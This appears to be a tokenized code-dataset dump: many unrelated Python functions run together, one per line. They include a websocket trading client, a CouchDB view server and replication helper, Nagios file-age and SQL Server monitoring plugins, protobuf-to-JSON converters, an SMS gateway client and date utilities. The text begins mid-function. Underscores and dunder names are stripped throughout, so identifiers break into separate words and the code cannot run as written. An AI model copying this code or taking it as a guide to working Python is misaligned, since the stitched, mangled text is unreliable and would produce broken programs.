time . append ( res ) return balance over time
def real time thread ( self ) : while self . ws client . connected ( ) : if self . die : break if self . pause : sleep ( 5 ) continue message = self . ws client . receive ( ) if message is None : break message type = message [ 'type' ] if message type == 'error' : continue if message [ 'sequence' ] <= self . sequence : continue if message type == 'open' : self . handle open ( message ) elif message type == 'match' : self . handle match ( message ) elif message type == 'done' : self . handle done ( message ) elif message type == 'change' : self . handle change ( message ) else : continue self . ws client . disconnect ( )
def keep alive thread ( self ) : while True : with self . lock : if self . connected ( ) : self . ws . ping ( ) else : self . disconnect ( ) self . thread = None return sleep ( 30 )
def connect ( self ) : if not self . connected ( ) : self . ws = create connection ( self . WS URI ) message = { 'type' : self . WS TYPE , 'product id' : self . WS PRODUCT ID } self . ws . send ( dumps ( message ) ) # There will be only one keep alive thread per client instance with self . lock : if not self . thread : thread = Thread ( target = self . keep alive thread , args = [ ] ) thread . start ( )
def handle data ( self , data ) : if data . strip ( ) : data = djeffify string ( data ) self . djhtml += data
def wrap color ( self , code , text , format = None , style = None ) : color = None if code [ : 3 ] == self . bg . PREFIX : color = self . bg . COLORS . get ( code , None ) if not color : color = self . fg . COLORS . get ( code , None ) if not color : raise Exception ( 'Color code not found' ) if format and format not in self . formats : raise Exception ( 'Color format not found' ) fmt = "0;" if format == 'bold' : fmt = "1;" elif format == 'underline' : fmt = "4;" # Manage the format parts = color . split ( '[' ) color = '{0}[{1}{2}' . format ( parts [ 0 ] , fmt , parts [ 1 ] ) if self . has colors and self . colors enabled : # Set brightness st = '' if style : st = self . st . COLORS . get ( style , '' ) return "{0}{1}{2}{3}" . format ( st , color , text , self . st . COLORS [ 'reset all' ] ) else : return text
def collect links ( self , env = None ) : for asset in self . assets . values ( ) : if asset . has bundles ( ) : asset . collect files ( ) if env is None : env = self . config . env if env == static bundle . ENV PRODUCTION : self . minify ( emulate = True ) self . add url prefix ( )
def replicate existing ( source db , target db ) : # Get the server from which to manage the replication. server = shortcuts . get server ( ) logger = logging . get Logger ( 'relax.couchdb.replicate' ) logger . debug ( 'POST ' + urlparse . urljoin ( server . resource . uri , '/ replicate' ) ) source , target = specifier to db ( source db ) , specifier to db ( target db ) logger . debug ( 'Source DB: %s' % ( source , ) ) logger . debug ( 'Target DB: %s' % ( target , ) ) try : resp headers , resp body = server . resource . post ( path = '/ replicate' , content = json . dumps ( { 'source' : source , 'target' : target } ) ) except couchdb . client . Server Error , exc : logger . error ( 'Replication failed.' ) raise Replication Error ( exc . args ) result = resp body [ 'history' ] [ 0 ] if resp body [ 'ok' ] : logger . info ( 'Replication %s... successful!' % ( resp body [ 'session id' ] [ : 6 ] , ) ) logger . info ( 'Replication started: ' + result [ 'start time' ] ) logger . info ( 'Replication finished: ' + result [ 'end time' ] ) result [ 'start time' ] = datetime . datetime . strptime ( result [ 'start time' ] , '%a, %d %b %Y %H:%M:%S GMT' ) result [ 'end time' ] = datetime . datetime . strptime ( result [ 'end time' ] , '%a, %d %b %Y %H:%M:%S GMT' ) timedelta = result [ 'end time' ] - result [ 'start time' ] if timedelta . days : logger . info ( 'Replication took %d days and %.2f seconds.' % ( timedelta . days , timedelta . seconds + ( timedelta . microseconds * ( 1e-6 ) ) ) ) else : logger . info ( 'Replication took %.2f seconds.' % ( timedelta . seconds + ( timedelta . microseconds * ( 1e-6 ) ) ) ) # Prepare the 'result' dictionary. result [ 'ok' ] = resp body [ 'ok' ] result [ 'session id' ] = resp body [ 'session id' ] result [ 'source last seq' ] = resp body [ 'source last seq' ] # Info-log the number of docs read/written and checked/found. if result [ 'docs read' ] == 1 : docs read = '1 document read' else : docs read = '%d documents read' % ( result [ 'docs read' ] , ) if result [ 'docs written' ] == 1 : docs written = '1 document written' else : docs written = '%d documents written' % ( result [ 'docs written' ] , ) if result [ 'missing checked' ] == 1 : missing checked = 'Checked for 1 missing document, found %d.' % ( result [ 'missing found' ] , ) else : missing checked = 'Checked for %d missing documents, found %d.' % ( result [ 'missing checked' ] , result [ 'missing found' ] , ) logging . info ( '%s, %s' % ( docs read , docs written ) ) logging . info ( missing checked ) return result else : logger . error ( 'Replication %s... failed.' % ( resp body [ 'session id' ] [ : 6 ] , ) ) result [ 'ok' ] = resp body [ 'ok' ] result [ 'session id' ] = resp body [ 'session id' ] result [ 'source last seq' ] = resp body [ 'source last seq' ] raise Replication Failure ( resp headers , result )
def require ( name , field , data type ) : if not isinstance ( field , data type ) : msg = '{0} must have {1}, got: {2}' . format ( name , data type , field ) raise Assertion Error ( msg )
def flush ( self ) : queue = self . queue size = queue . qsize ( ) queue . join ( ) self . log . debug ( 'successfully flushed %s items.' , size )
def open ( name = None , fileobj = None , closefd = True ) : return Guesser ( ) . open ( name = name , fileobj = fileobj , closefd = closefd )
def marv ( ctx , config , loglevel , logfilter , verbosity ) : if config is None : cwd = os . path . abspath ( os . path . curdir ) while cwd != os . path . sep : config = os . path . join ( cwd , 'marv.conf' ) if os . path . exists ( config ) : break cwd = os . path . dirname ( cwd ) else : config = '/etc/marv/marv.conf' if not os . path . exists ( config ) : config = None ctx . obj = config setup logging ( loglevel , verbosity , logfilter )
def main ( global config , * * settings ) : set cache regions from settings ( settings ) config = Configurator ( settings = settings ) config . include ( 'cms' ) config . configure celery ( global config [ ' file ' ] ) return config . make wsgi app ( )
def get function ( function name ) : module , basename = str ( function name ) . rsplit ( '.' , 1 ) try : return getattr ( import ( module , fromlist = [ basename ] ) , basename ) except ( Import Error , Attribute Error ) : raise Function Not Found ( function name )
def handle add fun ( self , function name ) : function name = function name . strip ( ) try : function = get function ( function name ) except Exception , exc : self . wfile . write ( js error ( exc ) + NEWLINE ) return # This tests to see if the function has been decorated with the view # server synchronisation decorator (``decorate view``). if not getattr ( function , 'view decorated' , None ) : self . functions [ function name ] = ( self . function counter , function ) # The decorator gets called with the logger function. else : self . functions [ function name ] = ( self . function counter , function ( self . log ) ) self . function counter += 1 return True
def handle map doc ( self , document ) : # This uses the stored set of functions, sorted by order of addition. for function in sorted ( self . functions . values ( ) , key = lambda x : x [ 0 ] ) : try : # It has to be run through ``list``, because it may be a #generator function. yield [ list ( function ( document ) ) ] except Exception , exc : # Otherwise, return an empty list and log the event. yield [ ] self . log ( repr ( exc ) )
def handle reduce ( self , reduce function names , mapped docs ) : reduce functions = [ ] # This gets a large list of reduction functions, given their names. for reduce function name in reduce function names : try : reduce function = get function ( reduce function name ) if getattr ( reduce function , 'view decorated' , None ) : reduce function = reduce function ( self . log ) reduce functions . append ( reduce function ) except Exception , exc : self . log ( repr ( exc ) ) reduce functions . append ( lambda * args , * * kwargs : None ) # Transform lots of (key, value) pairs into one (keys, values) pair. keys , values = zip ( ( key , value ) for ( ( key , doc id ) , value ) in mapped docs ) # This gets the list of results from the reduction functions. results = [ ] for reduce function in reduce functions : try : results . append ( reduce function ( keys , values , rereduce = False ) ) except Exception , exc : self . log ( repr ( exc ) ) results . append ( None ) return [ True , results ]
def handle rereduce ( self , reduce function names , values ) : # This gets a large list of reduction functions, given their names. reduce functions = [ ] for reduce function name in reduce function names : try : reduce function = get function ( reduce function name ) if getattr ( reduce function , 'view decorated' , None ) : reduce function = reduce function ( self . log ) reduce functions . append ( reduce function ) except Exception , exc : self . log ( repr ( exc ) ) reduce functions . append ( lambda * args , * * kwargs : None ) # This gets the list of results from those functions. results = [ ] for reduce function in reduce functions : try : results . append ( reduce function ( None , values , rereduce = True ) ) except Exception , exc : self . log ( repr ( exc ) ) results . append ( None ) return [ True , results ]
def handle validate ( self , function name , new doc , old doc , user ctx ) : try : function = get function ( function name ) except Exception , exc : self . log ( repr ( exc ) ) return False try : return function ( new doc , old doc , user ctx ) except Exception , exc : self . log ( repr ( exc ) ) return repr ( exc )
def handle ( self ) : while True : try : line = self . rfile . readline ( ) try : # All input data are lines of JSON like the following: #   ["<cmd name>" "<cmd arg1>" "<cmd arg2>" ...] # So I handle this by dispatching to various methods. cmd = json . loads ( line ) except Exception , exc : # Sometimes errors come up. Once again, I can't predict # anything, but can at least tell Couch DB about the error. self . wfile . write ( repr ( exc ) + NEWLINE ) continue else : #Automagically get the command handler. handler = getattr ( self , 'handle ' + cmd [ 0 ] , None ) if not handler : # We are ready to not find commands. It probably won't # happen, but fortune favours the prepared. self . wfile . write ( repr ( Command Not Found ( cmd [ 0 ] ) ) + NEWLINE ) continue return value = handler ( * cmd [ 1 : ] ) if not return value : continue # We write the output back to Couch DB. self . wfile . write ( one lineify ( json . dumps ( return value ) ) + NEWLINE ) except Exception , exc : self . wfile . write ( repr ( exc ) + NEWLINE ) continue
def log ( self , string ) : self . wfile . write ( json . dumps ( { 'log' : string } ) + NEWLINE )
def revoke token ( self , token , callback ) : yield Task ( self . data store . remove , 'tokens' , token = token ) callback ( )
def merge ordered ( ordereds : typing . Iterable [ typing . Any ] ) -> typing . Iterable [ typing . Any ] : seen set = set ( ) add seen = seen set . add return reversed ( tuple ( map ( lambda obj : add seen ( obj ) or obj , filterfalse ( seen set . contains , chain . from iterable ( map ( reversed , reversed ( ordereds ) ) ) , ) , ) ) )
def main ( ) : plugin = Register ( ) if plugin . args . option == 'filenumber' : plugin . filenumber handle ( ) elif plugin . args . option == 'fileage' : plugin . fileage handle ( ) elif plugin . args . option == 'sqlserverlocks' : plugin . sqlserverlocks handle ( ) else : plugin . unknown ( "Unknown actions." )
def filenumber handle ( self ) : self . file list = [ ] self . count = 0 status = self . ok if self . args . recursion : self . result , self . file list = self . get folder ( self . args . path ) else : self . result , self . file list = self . get file ( self . args . path ) # Compare the vlaue. if self . result > self . args . critical : status = self . critical elif self . result > self . args . warning : status = self . warning else : status = self . ok # Output self . shortoutput = "Found {0} files in {1}." . format ( self . result , self . args . path ) self . logger . debug ( "file list: {}" . format ( self . file list ) ) [ self . longoutput . append ( file data . get ( 'Name' ) ) for file data in self . file list ] self . perfdata . append ( "{path}={result};{warn};{crit};0;" . format ( crit = self . args . critical , warn = self . args . warning , result = self . result , path = self . args . path ) ) # Return status with message to Nagios. status ( self . output ( long output limit = None ) ) self . logger . debug ( "Return status and exit to Nagios." )
def get current datetime ( self ) : self . wql time = "SELECT Local Date Time FROM Win32 Operating System" self . current time = self . query ( self . wql time ) # [{'Local Date Time': '20160824161431.977000+480'}]' self . current time string = str ( self . current time [ 0 ] . get ( 'Local Date Time' ) . split ( '.' ) [ 0 ] ) # '20160824161431' self . current time format = datetime . datetime . strptime ( self . current time string , '%Y%m%d%H%M%S' ) # param: datetime.datetime(2016, 8, 24, 16, 14, 31) -> type: # datetime.datetime return self . current time format
def fileage handle ( self ) : self . file list = [ ] self . ok file = [ ] self . warn file = [ ] self . crit file = [ ] status = self . ok if self . args . recursion : self . file list = self . get folder ( self . args . path ) else : self . file list = self . get file ( self . args . path ) self . logger . debug ( "file list: {}" . format ( self . file list ) ) # [{'Last Modified': '20160824142017.737101+480', 'Name': 'd:\\test\\1.txt'}, # {'Last Modified': '20160824142021.392101+480', 'Name': 'd:\\test\\2.txt'}, # {'Last Modified': '20160824142106.460101+480', 'Name': 'd:\\test\\test1\\21.txt'}] for file dict in self . file list : self . filename = file dict . get ( 'Name' ) if self . filename and self . filename != 'Name' : self . logger . debug ( "===== start to compare {} =====" . format ( self . filename ) ) self . file datetime string = file dict . get ( 'Last Modified' ) . split ( '.' ) [ 0 ] self . file datetime = datetime . datetime . strptime ( self . file datetime string , '%Y%m%d%H%M%S' ) self . logger . debug ( "file datetime: {}" . format ( self . file datetime ) ) self . current datetime = self . get current datetime ( ) self . logger . debug ( "current datetime: {}" . format ( self . current datetime ) ) self . delta datetime = self . current datetime - self . file datetime self . logger . debug ( "delta datetime: {}" . format ( self . delta datetime ) ) self . logger . debug ( "warn datetime: {}" . format ( datetime . timedelta ( minutes = self . args . warning ) ) ) self . logger . debug ( "crit datetime: {}" . format ( datetime . timedelta ( minutes = self . args . critical ) ) ) if self . delta datetime > datetime . timedelta ( minutes = self . args . critical ) : self . crit file . append ( self . filename ) elif self . delta datetime > datetime . timedelta ( minutes = self . args . warning ) : self . warn file . append ( self . filename ) else : self . ok file . append ( self . filename ) # Compare the vlaue. if self . crit file : status = self . critical elif self . warn file : status = self . warning else : status = self . ok # Output self . shortoutput = "Found {0} files out of date." . format ( len ( self . crit file ) ) if self . crit file : self . longoutput . append ( "===== Critical File out of date ====" ) [ self . longoutput . append ( filename ) for filename in self . crit file if self . crit file ] if self . warn file : self . longoutput . append ( "===== Warning File out of date ====" ) [ self . longoutput . append ( filename ) for filename in self . warn file if self . warn file ] if self . ok file : self . longoutput . append ( "===== OK File out of date ====" ) [ self . longoutput . append ( filename ) for filename in self . ok file if self . ok file ] self . perfdata . append ( "{path}={result};{warn};{crit};0;" . format ( crit = self . args . critical , warn = self . args . warning , result = len ( self . crit file ) , path = self . args . drive + self . args . path ) ) # Return status with message to Nagios. status ( self . output ( long output limit = None ) ) self . logger . debug ( "Return status and exit to Nagios." )
def get version ( relpath ) : from os . path import dirname , join if ' file ' not in globals ( ) : # Allow to use function interactively root = '.' else : root = dirname ( file ) # The code below reads text file with unknown encoding in # in Python2/3 compatible way. Reading this text file # without specifying encoding will fail in Python 3 on some # systems (see http://goo.gl/5Xm OH). Specifying encoding as # open() parameter is incompatible with Python 2 # cp437 is the encoding without missing points, safe against: #   Unicode Decode Error: 'charmap' codec can't decode byte... for line in open ( join ( root , relpath ) , 'rb' ) : line = line . decode ( 'cp437' ) if ' version ' in line : if '"' in line : #  version  = "0.9" return line . split ( '"' ) [ 1 ] elif "'" in line : return line . split ( "'" ) [ 1 ]
def Get Top Level Containing Type ( self ) : desc = self while desc . containing type is not None : desc = desc . containing type return desc
def Find Method By Name ( self , name ) : for method in self . methods : if name == method . name : return method return None
def main ( ) : plugin = Register ( ) if plugin . args . option == 'sqlserverlocks' : plugin . sqlserverlocks handle ( ) else : plugin . unknown ( "Unknown actions." )
def Message To Json Object ( message , including default value fields ) : message descriptor = message . DESCRIPTOR full name = message descriptor . full name if Is Wrapper Message ( message descriptor ) : return Wrapper Message To Json Object ( message ) if full name in WKTJSONMETHODS : return WKTJSONMETHODS [ full name ] [ 0 ] ( message , including default value fields ) js = { } return Regular Message To Json Object ( message , js , including default value fields )
def Struct Message To Json Object ( message , unused including default = False ) : fields = message . fields ret = { } for key in fields : ret [ key ] = Value Message To Json Object ( fields [ key ] ) return ret
def Convert Value Message ( value , message ) : if isinstance ( value , dict ) : Convert Struct Message ( value , message . struct value ) elif isinstance ( value , list ) : Convert List Value Message ( value , message . list value ) elif value is None : message . null value = 0 elif isinstance ( value , bool ) : message . bool value = value elif isinstance ( value , six . string types ) : message . string value = value elif isinstance ( value , INT OR FLOAT ) : message . number value = value else : raise Parse Error ( 'Unexpected type for Value message.' )
def Convert List Value Message ( value , message ) : if not isinstance ( value , list ) : raise Parse Error ( 'List Value must be in [] which is {0}.' . format ( value ) ) message . Clear Field ( 'values' ) for item in value : Convert Value Message ( item , message . values . add ( ) )
def Convert Struct Message ( value , message ) : if not isinstance ( value , dict ) : raise Parse Error ( 'Struct must be in a dict which is {0}.' . format ( value ) ) for key in value : Convert Value Message ( value [ key ] , message . fields [ key ] ) return
def update config ( new config ) : flask app . base config . update ( new config ) # Check for changed working directory. if new config . has key ( 'working directory' ) : wd = os . path . abspath ( new config [ 'working directory' ] ) if nbmanager . notebook dir != wd : if not os . path . exists ( wd ) : raise IO Error ( 'Path not found: %s' % wd ) nbmanager . notebook dir = wd
def end timing ( self ) : if self . callback != None : elapsed = time . clock ( ) * 1000 - self . start self . callback . end timing ( self . counter , elapsed )
def From Json String ( self , value ) : self . Clear ( ) for path in value . split ( ',' ) : self . paths . append ( path )
def get doc ( doc id , db name , server url = 'http://127.0.0.1:5984/' , rev = None ) : db = get server ( server url ) [ db name ] if rev : headers , response = db . resource . get ( doc id , rev = rev ) return couchdb . client . Document ( response ) return db [ doc id ]
def read ( readme ) : extend = os . path . splitext ( readme ) [ 1 ] if ( extend == '.rst' ) : import codecs return codecs . open ( readme , 'r' , 'utf-8' ) . read ( ) elif ( extend == '.md' ) : import pypandoc return pypandoc . convert ( readme , 'rst' )
def main ( ) : plugin = Register ( ) if plugin . args . option == 'sql' : plugin . sql handle ( ) elif plugin . args . option == 'database-used' : plugin . database used handle ( ) elif plugin . args . option == 'databaselog-used' : plugin . database log used handle ( ) else : plugin . unknown ( "Unknown actions." )
def remove ( self , collection , * * kwargs ) : callback = kwargs . pop ( 'callback' ) yield Op ( self . db [ collection ] . remove , kwargs ) callback ( )
def api call ( self , method name , * args , * * kwargs ) : params = kwargs . setdefault ( 'params' , { } ) params . update ( { 'key' : self . apikey } ) if self . token is not None : params . update ( { 'token' : self . token } ) http method = getattr ( requests , method name ) return http method ( TRELLO URL + self . url , * args , * * kwargs )
def arkt to unixt ( ark timestamp ) : res = datetime . datetime ( 2017 , 3 , 21 , 15 , 55 , 44 ) + datetime . timedelta ( seconds = ark timestamp ) return res . timestamp ( )
def close ( self ) : try : self . conn . close ( ) self . logger . debug ( "Close connect succeed." ) except pymssql . Error as e : self . unknown ( "Close connect error: %s" % e )
def splitext files only ( filepath ) : return ( ( filepath , '' ) if os . path . isdir ( filepath ) else os . path . splitext ( filepath ) )
def set time ( filename , mod time ) : log . debug ( 'Setting modified time to %s' , mod time ) mtime = calendar . timegm ( mod time . utctimetuple ( ) ) mtime += mod time . microsecond / 1000000 atime = os . stat ( filename ) . st atime os . utime ( filename , ( atime , mtime ) )
def get time ( filename ) : ts = os . stat ( filename ) . st mtime return datetime . datetime . utcfromtimestamp ( ts )
def ensure dir exists ( func ) : @ functools . wraps ( func ) def make if not present ( ) : dir = func ( ) if not os . path . isdir ( dir ) : os . makedirs ( dir ) return dir return make if not present
def age ( self ) : # 0 means this composer will never decompose if self . rounds == 1 : self . do run = False elif self . rounds > 1 : self . rounds -= 1
def run ( self ) : if not self . device : return try : data = "" while ( self . do run ) : try : if ( self . device . in Waiting ( ) > 1 ) : l = self . device . readline ( ) [ : - 2 ] l = l . decode ( "UTF-8" ) if ( l == "[" ) : # start recording data = "[" elif ( l == "]" ) and ( len ( data ) > 4 ) and ( data [ 0 ] == "[" ) : # now parse the input data = data + "]" self . store . register json ( data ) self . age ( ) elif ( l [ 0 : 3 ] == "  {" ) : # this is a data line data = data + " " + l else : # this is a slow interface - give it some time sleep ( 1 ) # then count down.. self . age ( ) except ( Unicode Decode Error , Value Error ) : # only accepting unicode: throw away the whole bunch data = "" # and count down the exit condition self . age ( ) except serial . serialutil . Serial Exception : print ( "Could not connect to the serial line at " + self . device name )
def getbalance ( self , url = 'http://services.ambientmobile.co.za/credits' ) : post XML List = [ ] post XML List . append ( "<api-key>%s</api-key>" % self . api key ) post XML List . append ( "<password>%s</password>" % self . password ) post XML = '<sms>%s</sms>' % "" . join ( post XML List ) result = self . curl ( url , post XML ) if result . get ( "credits" , None ) : return result [ "credits" ] else : raise Ambient SMS Error ( result [ "status" ] )
def sendmsg ( self , message , recipient mobiles = [ ] , url = 'http://services.ambientmobile.co.za/sms' , concatenate message = True , message id = str ( time ( ) ) . replace ( "." , "" ) , reply path = None , allow duplicates = True , allow invalid numbers = True , ) : if not recipient mobiles or not ( isinstance ( recipient mobiles , list ) or isinstance ( recipient mobiles , tuple ) ) : raise Ambient SMS Error ( "Missing recipients" ) if not message or not len ( message ) : raise Ambient SMS Error ( "Missing message" ) post XML List = [ ] post XML List . append ( "<api-key>%s</api-key>" % self . api key ) post XML List . append ( "<password>%s</password>" % self . password ) post XML List . append ( "<recipients>%s</recipients>" % "" . join ( [ "<mobile>%s</mobile>" % m for m in recipient mobiles ] ) ) post XML List . append ( "<msg>%s</msg>" % message ) post XML List . append ( "<concat>%s</concat>" % ( 1 if concatenate message else 0 ) ) post XML List . append ( "<message id>%s</message id>" % message id ) post XML List . append ( "<allow duplicates>%s</allow duplicates>" % ( 1 if allow duplicates else 0 ) ) post XML List . append ( "<allow invalid numbers>%s</allow invalid numbers>" % ( 1 if allow invalid numbers else 0 ) ) if reply path : post XML List . append ( "<reply path>%s</reply path>" % reply path ) post XML = '<sms>%s</sms>' % "" . join ( post XML List ) result = self . curl ( url , post XML ) status = result . get ( "status" , None ) if status and int ( status ) in [ 0 , 1 , 2 ] : return result else : raise Ambient SMS Error ( int ( status ) )
def curl ( self , url , post ) : try : req = urllib2 . Request ( url ) req . add header ( "Content-type" , "application/xml" ) data = urllib2 . urlopen ( req , post . encode ( 'utf-8' ) ) . read ( ) except urllib2 . URL Error , v : raise Ambient SMS Error ( v ) return dict From Xml ( data )
def is date type ( cls ) : if not isinstance ( cls , type ) : return False return issubclass ( cls , date ) and not issubclass ( cls , datetime )
def truncate ( when , unit , week start = mon ) : if is datetime ( when ) : if unit == millisecond : return when . replace ( microsecond = int ( round ( when . microsecond / 1000.0 ) ) * 1000 ) elif unit == second : return when . replace ( microsecond = 0 ) elif unit == minute : return when . replace ( second = 0 , microsecond = 0 ) elif unit == hour : return when . replace ( minute = 0 , second = 0 , microsecond = 0 ) elif unit == day : return when . replace ( hour = 0 , minute = 0 , second = 0 , microsecond = 0 ) elif unit == week : weekday = prevweekday ( when , week start ) return when . replace ( year = weekday . year , month = weekday . month , day = weekday . day , hour = 0 , minute = 0 , second = 0 , microsecond = 0 ) elif unit == month : return when . replace ( day = 1 , hour = 0 , minute = 0 , second = 0 , microsecond = 0 ) elif unit == year : return when . replace ( month = 1 , day = 1 , hour = 0 , minute = 0 , second = 0 , microsecond = 0 ) elif is date ( when ) : if unit == week : return prevweekday ( when , week start ) elif unit == month : return when . replace ( day = 1 ) elif unit == year : return when . replace ( month = 1 , day = 1 ) elif is time ( when ) : if unit == millisecond : return when . replace ( microsecond = int ( when . microsecond / 1000.0 ) * 1000 ) elif unit == second : return when . replace ( microsecond = 0 ) elif unit == minute : return when . replace ( second = 0 , microsecond = 0 ) return when
def weekday ( when , weekday , start = mon ) : if isinstance ( when , datetime ) : when = when . date ( ) today = when . weekday ( ) delta = weekday - today if weekday < start and today >= start : delta += 7 elif weekday >= start and today < start : delta -= 7 return when + timedelta ( days = delta )
def get db from db ( db string ) : server = get server from db ( db string ) local match = PLAIN RE . match ( db string ) remote match = URL RE . match ( db string ) # If this looks like a local specifier: if local match : return server [ local match . groupdict ( ) [ 'database' ] ] elif remote match : return server [ remote match . groupdict ( ) [ 'database' ] ] raise Value Error ( 'Invalid database string: %r' % ( db string , ) )
def ensure specifier exists ( db spec ) : local match = LOCAL RE . match ( db spec ) remote match = REMOTE RE . match ( db spec ) plain match = PLAIN RE . match ( db spec ) if local match : db name = local match . groupdict ( ) . get ( 'database' ) server = shortcuts . get server ( ) if db name not in server : server . create ( db name ) return True elif remote match : hostname , portnum , database = map ( remote match . groupdict ( ) . get , ( 'hostname' , 'portnum' , 'database' ) ) server = shortcuts . get server ( server url = ( 'http://%s:%s' % ( hostname , portnum ) ) ) if database not in server : server . create ( database ) return True elif plain match : db name = plain match . groupdict ( ) . get ( 'database' ) server = shortcuts . get server ( ) if db name not in server : server . create ( db name ) return True return False
def get events vote cluster ( self , delegate address ) : delegate pubkey = self . account details ( address = delegate address ) [ 'public key' ] plusvote = '+{delegate pubkey}' . format ( delegate pubkey = delegate pubkey ) resultset = self . cursor . execute and fetchall ( . format ( address = delegate address , transactions = self . scheme [ 'transactions' ] , blocks = self . scheme [ 'blocks' ] , mem accounts = self . scheme [ 'mem accounts' ] , mem accounts2delegates = self . scheme [ 'mem accounts2delegates' ] , votes = self . scheme [ 'votes' ] , plusvote = plusvote ) ) res = { } for i in resultset : if i [ 1 ] == 'transaction' : res . update ( { i [ 0 ] : { 'tx id' : i [ 0 ] , 'event type' : i [ 1 ] , 'amount' : i [ 2 ] , 'timestamp' : i [ 3 ] , 'recipient id' : i [ 4 ] , 'sender id' : i [ 5 ] , 'rawasset' : i [ 6 ] , 'type' : i [ 7 ] , 'fee' : i [ 8 ] , 'block id' : i [ 9 ] , 'height' : i [ 10 ] } } ) elif i [ 1 ] == 'block' : res . update ( { i [ 0 ] : { 'block id' : i [ 0 ] , 'event type' : i [ 1 ] , 'reward' : i [ 2 ] , 'total fee' : i [ 3 ] , 'timestamp' : i [ 8 ] , 'address' : i [ 5 ] , 'username' : i [ 6 ] , 'public key' : i [ 4 ] , 'height' : i [ 10 ] } } ) return res
def create commands ( self , commands , parser ) : self . apply defaults ( commands ) def create single command ( command ) : keys = command [ 'keys' ] del command [ 'keys' ] kwargs = { } for item in command : kwargs [ item ] = command [ item ] parser . add argument ( * keys , * * kwargs ) if len ( commands ) > 1 : for command in commands : create single command ( command ) else : create single command ( commands [ 0 ] )
def create subparsers ( self , parser ) : subparsers = parser . add subparsers ( ) for name in self . config [ 'subparsers' ] : subparser = subparsers . add parser ( name ) self . create commands ( self . config [ 'subparsers' ] [ name ] , subparser )
def show version ( self ) : class Show Version Action ( argparse . Action ) : def init ( inner self , nargs = 0 , * * kw ) : super ( Show Version Action , inner self ) . init ( nargs = nargs , * * kw ) def call ( inner self , parser , args , value , option string = None ) : print ( "{parser name} version: {version}" . format ( parser name = self . config . get ( "parser" , { } ) . get ( "prog" ) , version = self . prog version ) ) return Show Version Action
def check path action ( self ) : class Check Path Action ( argparse . Action ) : def call ( self , parser , args , value , option string = None ) : if type ( value ) is list : value = value [ 0 ] user value = value if option string == 'None' : if not os . path . isdir ( value ) : current user = os . path . expanduser ( "~" ) if not value . startswith ( current user ) and not value . startswith ( os . getcwd ( ) ) : if os . path . isdir ( os . path . join ( current user , value ) ) : value = os . path . join ( current user , value ) elif os . path . isdir ( os . path . join ( os . getcwd ( ) , value ) ) : value = os . path . join ( os . getcwd ( ) , value ) else : value = None else : value = None elif option string == '--template-name' : if not os . path . isdir ( value ) : if not os . path . isdir ( os . path . join ( args . target , value ) ) : value = None if not value : logger . error ( "Could not to find path %s. Please provide " "correct path to %s option" , user value , option string ) exit ( 1 ) setattr ( args , self . dest , value ) return Check Path Action
def Add Properties For Extensions ( descriptor , cls ) : extension dict = descriptor . extensions by name for extension name , extension field in extension dict . items ( ) : constant name = extension name . upper ( ) + " FIELD NUMBER" setattr ( cls , constant name , extension field . number )
